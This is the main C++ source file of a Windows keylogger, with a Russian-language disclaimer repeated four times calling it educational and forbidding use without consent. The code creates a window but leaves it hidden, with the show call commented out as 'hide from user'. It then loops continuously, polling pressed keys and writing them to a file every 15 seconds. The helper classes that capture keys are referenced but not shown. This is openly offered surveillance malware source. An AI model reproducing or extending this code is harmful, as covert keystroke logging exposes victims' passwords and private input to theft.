//!!!!!Этот кейлоггер написан исключительно в образовательных целях. Автор (Rome0Coder)запрещает использование данной программы на пк юзера, который не дал согласие на использование данного чуда!!
//!!!!!Этот кейлоггер написан исключительно в образовательных целях. Автор (Rome0Coder)запрещает использование данной программы на пк юзера, который не дал согласие на использование данного чуда!!
//!!!!!Этот кейлоггер написан исключительно в образовательных целях. Автор (Rome0Coder)запрещает использование данной программы на пк юзера, который не дал согласие на использование данного чуда!!
//!!!!!Этот кейлоггер написан исключительно в образовательных целях. Автор (Rome0Coder)запрещает использование данной программы на пк юзера, который не дал согласие на использование данного чуда!!
#include <Windows.h>
#include "Resource.h"
#include "KeyLogger.h"
#include "assert.hpp"
#include "GlobalVariables.hpp"
#include "InputHandler.hpp"
#include <thread>
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,_In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    LoadStringW(hInstance, IDS_APP_TITLE, GlobalVariables::get()->getTitle(), MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_KEYLOGGER, GlobalVariables::get()->getSzWindowClass(), MAX_LOADSTRING);
    auto m = GlobalVariables::get();
    MyRegisterClass(hInstance);
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }
    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_KEYLOGGER));
    MSG msg;
    setlocale(LC_ALL, "ru");
    while (true)
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        static DWORD refreshTime = GetTickCount() + 15000;
        if (GetTickCount() > refreshTime) {
            InputHandler::get()->printToFile(InputHandler::get()->GetDirectoryToFile().c_str());
            refreshTime += (GetTickCount() - refreshTime) + 15000;
        }
        InputHandler::get()->GetPressedChar();
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }

    return (int) msg.wParam;
}
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;
    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_KEYLOGGER));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = 0;
    wcex.lpszClassName  = GlobalVariables::get()->getSzWindowClass();
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   *GlobalVariables::get()->getHinst() = hInstance; // Сохранить маркер экземпляра в глобальной переменной
   HWND hWnd = CreateWindowW(GlobalVariables::get()->getSzWindowClass(), GlobalVariables::get()->getTitle(), WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
   if (!hWnd)
   {
      return FALSE;
   }
  // ShowWindow(hWnd, nCmdShow);hide from user
   UpdateWindow(hWnd);
   return TRUE;
}
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // Разобрать выбор в меню:
            switch (wmId)
            {           
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
   /* case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: Добавьте сюда любой код прорисовки, использующий HDC...
            EndPaint(hWnd, &ps);
        }
        break;*/
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    case WM_KEYDOWN:
    {
       // assert(wParam < 255 & wParam > 0);
      //  GlobalVariables::get()->getKeyInput()[wParam] = true;
       // InputHandler::get()->AddToBuffer(wParam);
        break;
    }
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

